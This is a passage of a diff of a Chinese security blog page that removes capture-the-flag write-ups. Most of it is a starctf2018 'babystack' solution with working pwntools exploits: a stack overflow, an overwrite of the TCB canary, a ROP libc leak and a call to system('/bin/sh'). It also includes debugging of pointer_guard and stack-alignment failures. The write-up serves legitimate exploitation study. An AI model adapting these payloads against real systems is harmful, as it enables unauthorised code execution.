p32(0)</span><br><span class="line">payload +&#x3D; p32(0)</span><br><span class="line">payload +&#x3D; p32(0x12)</span><br><span class="line">payload +&#x3D; &quot;system\x00&quot;</span><br><span class="line">payload +&#x3D; &#39;a&#39; * (80-len(payload))</span><br><span class="line">payload +&#x3D; sh +&#39;\x00&#39;</span><br><span class="line">payload +&#x3D; &#39;a&#39; * (100- len(payload))</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>运行结果</p>
-<p><img src="/image/ret2dl/success.png" alt="success"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/11/13/ret2dl/" data-id="ckhx9966h000zar5y8y9y8koa" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/binary/" rel="tag">binary</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-bypass-Canary" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/11/11/bypass-Canary/" class="article-date">
-  <time datetime="2020-11-11T10:19:56.000Z" itemprop="datePublished">2020-11-11</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/11/11/bypass-Canary/">bypass Canary</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>这道题是来自starctf2018的一道pwn题，主要是通过覆盖TCB结构体中的stack_guard值来bypass Canary的校验过程</p>
-<p>赛题链接:  <a target="_blank" rel="noopener" href="https://github.com/sixstars/starctf2018/tree/master/pwn-babystack">https://github.com/sixstars/starctf2018/tree/master/pwn-babystack</a></p>
-<p>TCB介绍: <a target="_blank" rel="noopener" href="http://www.openwall.com/lists/oss-security/2018/02/27/5">http://www.openwall.com/lists/oss-security/2018/02/27/5</a></p>
-<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul>
-<li>Ubuntu 18.04</li>
-<li>libc-2.27</li>
-</ul>
-<h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>由于大致了解解题细节，所以我就直接拿现成的exp来先运行试一下，如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.os &#x3D; &#39;linux&#39;</span><br><span class="line">context.terminal &#x3D; [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]</span><br><span class="line"># [&#39;CRITICAL&#39;, &#39;DEBUG&#39;, &#39;ERROR&#39;, &#39;INFO&#39;, &#39;NOTSET&#39;, &#39;WARN&#39;, &#39;WARNING&#39;]</span><br><span class="line">context.log_level &#x3D; &#39;INFO&#39;</span><br><span class="line"></span><br><span class="line">libc_path &#x3D; &#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;</span><br><span class="line">bin_path &#x3D; &#39;.&#x2F;bs&#39;</span><br><span class="line"></span><br><span class="line">libc &#x3D; ELF(libc_path)</span><br><span class="line">binary &#x3D; ELF(bin_path)</span><br><span class="line"></span><br><span class="line">host &#x3D; &#39;&#39;</span><br><span class="line">port &#x3D; 6666</span><br><span class="line"></span><br><span class="line">def debug(command&#x3D;&#39;&#39;):</span><br><span class="line">    gdb.attach(p, command)</span><br><span class="line"></span><br><span class="line">def exploit():</span><br><span class="line">    #debug(&#39;b *0x4009E7\n&#39;)</span><br><span class="line">    g &#x3D; lambda x: next(binary.search(asm(x, os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;amd64&#39;)))</span><br><span class="line">    pop_rdi &#x3D; g(&#39;pop rdi; ret&#39;)</span><br><span class="line">    pop_rsi_pop &#x3D; g(&#39;pop rsi; pop r15; ret&#39;)</span><br><span class="line">    leave &#x3D; g(&#39;leave; ret&#39;)</span><br><span class="line">    log.info(&quot;pop_rdi:     &quot; + hex(pop_rdi))</span><br><span class="line">    log.info(&quot;pop_rsi_pop: &quot; + hex(pop_rsi_pop))</span><br><span class="line">    log.info(&quot;leave:       &quot; + hex(leave))</span><br><span class="line"></span><br><span class="line">    size &#x3D; 8300</span><br><span class="line">    p.sendlineafter(&#39;send?\n&#39;, str(size))</span><br><span class="line"></span><br><span class="line">    fakebuf &#x3D; 0x602f00</span><br><span class="line">    payload &#x3D; &#39;&#39;</span><br><span class="line">    payload +&#x3D; &#39;A&#39;*0x1010</span><br><span class="line">    # stack pivot #step 1</span><br><span class="line">    payload +&#x3D; p64(fakebuf)</span><br><span class="line">    # ROP1 - leak libc </span><br><span class="line">    payload +&#x3D; p64(pop_rdi)</span><br><span class="line">    payload +&#x3D; p64(binary.got[&#39;puts&#39;])</span><br><span class="line">    payload +&#x3D; p64(binary.plt[&#39;puts&#39;])</span><br><span class="line">    # ROP2 - read </span><br><span class="line">    payload +&#x3D; p64(pop_rdi)</span><br><span class="line">    payload +&#x3D; p64(0)</span><br><span class="line">    payload +&#x3D; p64(pop_rsi_pop)</span><br><span class="line">    payload +&#x3D; p64(fakebuf)</span><br><span class="line">    payload +&#x3D; p64(0)</span><br><span class="line">    payload +&#x3D; p64(binary.plt[&#39;read&#39;])</span><br><span class="line">    # stack pivot #step 2</span><br><span class="line">    payload +&#x3D; p64(leave)</span><br><span class="line">   	# Override TCB Canary</span><br><span class="line">    payload &#x3D; payload.ljust(size, &#39;A&#39;)</span><br><span class="line">    </span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvuntil(&#39;goodbye.\n&#39;)</span><br><span class="line">    leak &#x3D; p.recvline().strip()[-6:].ljust(8, &#39;\0&#39;)</span><br><span class="line">    leak &#x3D; u64(leak)</span><br><span class="line">    libc.address &#x3D; leak - libc.sym[&#39;puts&#39;]</span><br><span class="line">    info(&quot;%#x&quot;, libc.address)</span><br><span class="line">    bin_sh &#x3D; libc.search(&#39;&#x2F;bin&#x2F;sh&#39;).next()</span><br><span class="line">    system &#x3D; libc.sym[&#39;system&#39;]</span><br><span class="line">    </span><br><span class="line">    payload &#x3D; &#39;&#39;</span><br><span class="line">    payload +&#x3D; p64(0)</span><br><span class="line">    payload +&#x3D; p64(pop_rdi)</span><br><span class="line">    payload +&#x3D; p64(bin_sh)</span><br><span class="line">    payload +&#x3D; p64(system)</span><br><span class="line"></span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    if len(sys.argv) &#x3D;&#x3D; 1:</span><br><span class="line">        global p</span><br><span class="line">        p &#x3D; process(executable&#x3D;bin_path, argv&#x3D;[bin_path]) #, env&#x3D;&#123;&#39;LD_PRELOAD&#39;:libc_path&#125;)</span><br><span class="line">    else:</span><br><span class="line">        p &#x3D; remote(sys.argv[1], int(sys.argv[2]))</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure>
-
-<p>这里我没有使用官方的libc(主要是我没找到。。)，直接使用了系统的libc</p>
-<p>主要的过程在注释里写的差不多了，大致上就是</p>
-<ul>
-<li>计算偏移，先填充0x1010个“A”至rbp(这一步同时覆盖了栈上的Canary为“AAAA”)</li>
-<li>stack pivot劫持rbp至.bss段</li>
-<li>由于libc默认PIE，所以需要调用puts函数leak出puts函数在got表的绝对地址</li>
-<li>寻找pop_rsi_pop、pop_rdi等一系列gadget，控制寄存器，准备调用read函数的参数</li>
-<li>根据puts leak出的puts函数在got表的绝对地址，计算偏移得到libc的基地址，并基于libc的基地址算出read函数的绝对地址</li>
-<li>构造ROP，用“A”填充ROP至8300个字节(这一步同时利用超长的“A”，覆盖了TCB中的stack_guard值为“AAAA”，从而绕过Canary的校验)</li>
-<li>将ROP填入栈上对应位置</li>
-<li>在我们填入的read函数被调用时，将真正的exp通过read函数写入.bss上被劫持的栈</li>
-<li>最后leave，将栈完全劫持到.bss段执行</li>
-</ul>
-<p>过程还是比较明了的，于是我运行了一下</p>
-<p>然而，这个exp在我的机器上并不能成功的getshell，但是，在ubuntu 16.04上却可以成功getshell。</p>
-<p>疑惑.jpg，话不多说，gdb搞起</p>
-<h1 id="WHY"><a href="#WHY" class="headerlink" title="WHY?"></a>WHY?</h1><p>gdb单步调试至我们最终执行的payload处</p>
-<p>首先，可以看到程序确实被劫持到了system函数，并且rdi确实指向了“/bin/sh”字符串</p>
-<p><img src="/image/bypass-Canary/enter_system.png" alt="enter_system"></p>
-<p>看上去一切正常，继续跟进去看看</p>
-<p>当我调试到这一步时，程序崩溃了</p>
-<p><img src="/image/bypass-Canary/rax_gg.png" alt="rax_gg"></p>
-<p>可以看到，<code>&lt;do_system+359&gt; call rax</code>尝试调用rax寄存器所指向的函数</p>
-<p>但仔细看一下rax的值，可以发现为0x74e75a79b3d1d1ee，远远超出了可以访问的内存地址空间</p>
-<p>所以自然而然的，程序在此崩溃</p>
-<p>那么为什么会出现这么异常的rax值呢？</p>
-<p>我把目光放在了前面的一段汇编代码上，即<code>&lt;do_system+343&gt; xor rax, QWORD PTR fs:0x30</code> </p>
-<p>我将<code>0x74e75a79b3d1d1ee</code>与xor之前的rax的值<code>0x35a61b38f29090af</code>进行xor，得到了<code>fs:0x30</code>的值为<code>0x4141414141414141</code></p>
-<p>看到这，可能有人还是不理解，这里贴一下TCB的结构</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  void *tcb;                &#x2F;* Pointer to the TCB.  Not necessarily the</span><br><span class="line">                           thread descriptor used by libpthread.  *&#x2F;</span><br><span class="line">  dtv_t *dtv;</span><br><span class="line">  void *self;                &#x2F;* Pointer to the thread descriptor.  *&#x2F;</span><br><span class="line">  int multiple_threads;</span><br><span class="line">  int gscope_flag;</span><br><span class="line">  uintptr_t sysinfo;</span><br><span class="line">  uintptr_t stack_guard;</span><br><span class="line">  uintptr_t pointer_guard;</span><br><span class="line">  unsigned long int vgetcpu_cache[2];</span><br><span class="line">  &#x2F;* Bit 0: X86_FEATURE_1_IBT.</span><br><span class="line">     Bit 1: X86_FEATURE_1_SHSTK.</span><br><span class="line">   *&#x2F;</span><br><span class="line">  unsigned int feature_1;</span><br><span class="line">  int __glibc_unused1;</span><br><span class="line">  &#x2F;* Reservation of some values for the TM ABI.  *&#x2F;</span><br><span class="line">  void *__private_tm[4];</span><br><span class="line">  &#x2F;* GCC split stack support.  *&#x2F;</span><br><span class="line">  void *__private_ss;</span><br><span class="line">  &#x2F;* The lowest address of shadow stack,  *&#x2F;</span><br><span class="line">  unsigned long long int ssp_base;</span><br><span class="line">  &#x2F;* Must be kept even if it is no longer used by glibc since programs,</span><br><span class="line">     like AddressSanitizer, depend on the size of tcbhead_t.  *&#x2F;</span><br><span class="line">  __128bits __glibc_unused2[8][4] __attribute__ ((aligned (32)));</span><br><span class="line">  void *__padding[8];</span><br><span class="line">&#125; tcbhead_t;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<p>看到这儿想必大家也知道了原因，由于<code>fs:0x28</code>处就是stack_guard，而原payload在没有计算任何偏移的情况下暴力覆盖了8300个字节，在覆盖stack_guard的同时也将<code>fs:0x30</code>处的pointer_guard覆盖为了<code>0x4141414141414141</code>而在libc2.27中的system函数在实现过程中需要利用这个值做指针的校验，于是便触发了崩溃。</p>
-<p>那要解决这个问题其实很简单，我们可以看到，<code>stack_guard</code>在相对于<code>pointer_guard</code>的低位，所以我们只需要精确计算出需要覆盖的偏移量，仅覆盖至<code>stack_guard</code>即可</p>
-<p>通过命令<code>x/32gx pthread_self()</code>我查看到了TCB的结构以及其地址，确定了<code>stack_guard</code>与溢出点<code>buf</code>之间的偏移</p>
-<p>TIPS：在gdb中，你是无法直接查看到fs寄存器指向的地址的，因为其引用的TCB结构只有当前线程才可以访问，所以要借助<code>x/32gx pthread_self()</code>来访问，而各类gdb插件所显示的fs都是0x0，是不正确的</p>
-<p>此时修改exp如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.os &#x3D; &#39;linux&#39;</span><br><span class="line">#context.terminal &#x3D; [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]</span><br><span class="line"># [&#39;CRITICAL&#39;, &#39;DEBUG&#39;, &#39;ERROR&#39;, &#39;INFO&#39;, &#39;NOTSET&#39;, &#39;WARN&#39;, &#39;WARNING&#39;]</span><br><span class="line">context.log_level &#x3D; &#39;DEBUG&#39;</span><br><span class="line"></span><br><span class="line">libc_path &#x3D; &#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;</span><br><span class="line">bin_path &#x3D; &#39;.&#x2F;bs&#39;</span><br><span class="line"></span><br><span class="line">libc &#x3D; ELF(libc_path)</span><br><span class="line">binary &#x3D; ELF(bin_path)</span><br><span class="line"></span><br><span class="line">host &#x3D; &#39;&#39;</span><br><span class="line">port &#x3D; 6666</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def debug(command&#x3D;&#39;&#39;):</span><br><span class="line">    gdb.attach(p, command)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def exploit():</span><br><span class="line">    # debug(&#39;b *0x4009E7\n&#39;)</span><br><span class="line">    g &#x3D; lambda x: next(binary.search(asm(x, os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;amd64&#39;)))</span><br><span class="line">    pop_rdi &#x3D; g(&#39;pop rdi; ret&#39;)</span><br><span class="line">    pop_rsi_pop &#x3D; g(&#39;pop rsi; pop r15; ret&#39;)</span><br><span class="line">    leave &#x3D; g(&#39;leave; ret&#39;)</span><br><span class="line">    </span><br><span class="line">    log.info(&quot;pop_rdi:     &quot; + hex(pop_rdi))</span><br><span class="line">    log.info(&quot;pop_rsi_pop: &quot; + hex(pop_rsi_pop))</span><br><span class="line">    log.info(&quot;leave:       &quot; + hex(leave))</span><br><span class="line"></span><br><span class="line">    size &#x3D; 0x1850</span><br><span class="line">    p.sendlineafter(&#39;send?\n&#39;, str(size))</span><br><span class="line"></span><br><span class="line">    fakebuf &#x3D; 0x602f00</span><br><span class="line">    payload &#x3D; &#39;&#39;</span><br><span class="line">    payload +&#x3D; &#39;A&#39; * 0x1010</span><br><span class="line">    # stack pivot #step 1</span><br><span class="line">    payload +&#x3D; p64(fakebuf)</span><br><span class="line">    # ROP1 - leak libc</span><br><span class="line">    payload +&#x3D; p64(pop_rdi)</span><br><span class="line">    payload +&#x3D; p64(binary.got[&#39;puts&#39;])</span><br><span class="line">    payload +&#x3D; p64(binary.plt[&#39;puts&#39;])</span><br><span class="line">    # ROP2 - read</span><br><span class="line">    payload +&#x3D; p64(pop_rdi)</span><br><span class="line">    payload +&#x3D; p64(0)</span><br><span class="line">    payload +&#x3D; p64(pop_rsi_pop)</span><br><span class="line">    payload +&#x3D; p64(fakebuf)</span><br><span class="line">    payload +&#x3D; p64(0)</span><br><span class="line">    payload +&#x3D; p64(binary.plt[&#39;read&#39;])</span><br><span class="line">    # stack pivot #step 2</span><br><span class="line">    payload +&#x3D; p64(leave)</span><br><span class="line">    # Override TCB Canary</span><br><span class="line">    payload &#x3D; payload.ljust(size, &#39;A&#39;)</span><br><span class="line">    #print(&quot;pid &quot; + str(proc.pidof(p)))</span><br><span class="line">    #raw_input(&quot;attach me&quot;)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    #print(&quot;pid &quot; + str(proc.pidof(p)))</span><br><span class="line">    #raw_input(&quot;attach me&quot;)</span><br><span class="line">    p.recvuntil(&#39;goodbye.\n&#39;)</span><br><span class="line">    leak &#x3D; p.recv(6)+&#39;\x00\x00&#39;</span><br><span class="line">    leak &#x3D; u64(leak)</span><br><span class="line">    #info(&quot;libc.address is %#x&quot;, libc.address)</span><br><span class="line">    #print(&quot;leak:&quot;, leak)</span><br><span class="line">    #print(&quot;sym:&quot;, libc.symbols[&#39;puts&#39;])</span><br><span class="line">    libc.address &#x3D; leak - libc.symbols[&#39;puts&#39;]</span><br><span class="line"></span><br><span class="line">    #print(&quot;leak:&quot;,leak)</span><br><span class="line">    #print(&quot;sym:&quot;,libc.symbols[&#39;puts&#39;])</span><br><span class="line">    info(&quot;libc.address is %#x&quot;, libc.address)</span><br><span class="line">    bin_sh &#x3D; libc.search(&#39;&#x2F;bin&#x2F;sh&#39;).next()</span><br><span class="line">    system &#x3D; libc.sym[&#39;system&#39;]</span><br><span class="line"></span><br><span class="line">    #payload &#x3D; &#39;&#39;</span><br><span class="line">    #payload +&#x3D; p64(0)</span><br><span class="line">    #payload +&#x3D; p64((libc.address+0x4f3c2))</span><br><span class="line">    payload &#x3D; &#39;&#39;</span><br><span class="line">    payload +&#x3D; p64(0)</span><br><span class="line">    payload +&#x3D; p64(pop_rdi)</span><br><span class="line">    payload +&#x3D; p64(bin_sh)</span><br><span class="line">    payload +&#x3D; p64(system)</span><br><span class="line"></span><br><span class="line">    p.send(payload)</span><br><span class="line">    #print (&quot;pid &quot; + str(proc.pidof(p)))</span><br><span class="line">    #raw_input(&quot;attach me&quot;)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    if len(sys.argv) &#x3D;&#x3D; 1:</span><br><span class="line">        global p</span><br><span class="line">        p &#x3D; process(executable&#x3D;bin_path, argv&#x3D;[bin_path])  # , env&#x3D;&#123;&#39;LD_PRELOAD&#39;:libc_path&#125;)</span><br><span class="line">    else:</span><br><span class="line">        p &#x3D; remote(sys.argv[1], int(sys.argv[2]))</span><br><span class="line">    exploit()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<p>修改了payload的长度，仅覆盖至<code>stack_guard</code>即可</p>
-<p>本以为大功告成，可是事与愿违，当我再次运行exp时，仍然抛出了错误</p>
-<p>我:????????</p>
-<p>本以为是改的不对，计算错了偏移量，但是当我再一次gdb调试后，发现原来的错误处已经正常</p>
-<p><img src="/image/bypass-Canary/also_gg.png" alt="also_gg"></p>
-<p>那就很奇怪了，为什么还是不行呢？</p>
-<p>继续调试，同时我写了一个正常调用system函数的代码做对比</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;errno.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;pthread.h&gt;</span><br><span class="line">#include &lt;asm&#x2F;prctl.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;prctl.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">void * start()&#123;</span><br><span class="line"> getchar();</span><br><span class="line"> system(&quot;&#x2F;bin&#x2F;sh&quot;);</span><br><span class="line"> return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    pthread_t t;</span><br><span class="line">    pthread_create(&amp;t, NULL, &amp;start, 0);</span><br><span class="line">    if (pthread_join(t, NULL) !&#x3D; 0) &#123;</span><br><span class="line">        puts(&quot;exit failure&quot;);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line">    puts(&quot;Bye bye&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>经过长时间的调试，我发现了奇怪的地方</p>
-<p><img src="/image/bypass-Canary/wired.png" alt="wired"></p>
-<p>这里显示syscall调用的是<code>wait4()</code>这个系统调用，如果是正常的调用system函数，程序应当在syscall执行之后阻塞，但是在执行exp时，却并没有阻塞，而是直接跳了过去，那也就是说<code>wait4()</code>并没有阻塞，而是直接退出了</p>
-<p>这令我很疑惑，于是我查看了<code>wait4()</code>试图等待的进程pid，即rdi寄存器的值，如下</p>
-<p><img src="/image/bypass-Canary/pid_gg.png" alt="pid_gg"></p>
-<p>可以发现，<code>wait4()</code>想要等待的进程已经退出，成为了僵尸进程，而如果正常调用system，那么<code>wait4()</code>等待的进程应当如下</p>
-<p><img src="/image/bypass-Canary/pid_not_gg.png" alt="pid_not_gg"></p>
-<p>也就是说，system调用的<code>/bin/sh</code>并没有成功启动，于是，我把目光转向了之前的汇编代码，寻找启动<code>/bin/sh</code>的地方</p>
-<p>很快我就找到了相关代码</p>
-<p><img src="/image/bypass-Canary/start_system.png" alt="start_system"></p>
-<p>可以看到这里syscall调用了clone这个系统调用，就是在这里，<code>/bin/sh</code>被启动了</p>
-<p>之后我便做了对比，但是我却发现，正常情况下，当执行到此处汇编代码时，完全可以正常启动，而各个寄存器参数值与我使用exp时并无太大区别，按理说并不会无法启动</p>
-<p>到这里算是陷入了僵局，正当我掉头发时，我突然想起了之前看过的一篇文章 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/Rookle/p/12871878.html">https://www.cnblogs.com/Rookle/p/12871878.html</a></p>
-<p>而你也可以看到，在使用exp时，当程序执行到syscall时，rsp并没有16字节对齐</p>
-<p>于是我抱着试试看的心态，手动将rsp对齐</p>
-<p><img src="/image/bypass-Canary/alignment.png" alt="alignment"></p>
-<p>执行</p>
-<p><img src="/image/bypass-Canary/after_align.png" alt="after_align"></p>
-<p>此时rax是返回的进程pid，查看一下进程情况</p>
-<p><img src="/image/bypass-Canary/clone_successfuly.png" alt="clone_successfuly"></p>
-<p>可以看到，正常地启动了</p>
-<p>那么也就是说，在syscall前，我们必须保证rsp对齐16字节</p>
-<p>其实在exp中要解决这个问题也简单，只需要在最终的payload中添加一个ret的gadget就可以了</p>
-<p>最终版如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python</span><br><span 